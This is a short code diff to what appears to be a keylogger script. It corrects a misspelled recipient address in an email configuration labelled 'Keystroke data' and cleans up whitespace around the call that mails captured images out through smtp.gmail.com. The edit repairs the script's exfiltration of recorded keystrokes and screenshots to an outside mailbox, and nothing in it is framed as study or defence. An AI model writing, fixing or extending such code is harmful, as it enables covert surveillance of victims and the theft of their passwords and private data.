@@ -8,7 +8,7 @@ import os
 
 EMAIL_USER = "youremail@gmail.com"
 EMAIL_PASSWORD = "password123"
-EMAIL_SEND = "youreamil@gmail.com"
+EMAIL_SEND = "youremail@gmail.com"
 SUBJECT = "Keystroke data"
 HOST = "smtp.gmail.com"
 PORT = 587
@@ -55,6 +55,4 @@ def send_images(images_path):
         msg.attach(part)
         text = msg.as_string()
 
-    call_mail_server(text)
-
-    
+    call_mail_server(text)    
